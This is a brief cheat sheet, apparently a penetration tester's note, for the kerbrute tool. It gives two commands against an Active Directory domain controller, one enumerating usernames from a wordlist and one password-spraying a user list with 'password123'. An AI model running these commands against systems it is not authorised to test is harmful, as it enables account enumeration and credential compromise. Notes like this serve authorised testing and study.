# kerbrute
https://github.com/ropnop/kerbrute

## enumerate users using wordlist
```bash
kerbrute userenum --dc $IP -d DOMAIN.local $FILE
```

## password spray users from user list file
```bash
kerbrute passwordspray --dc $IP -d DOMAIN.local users password123
```
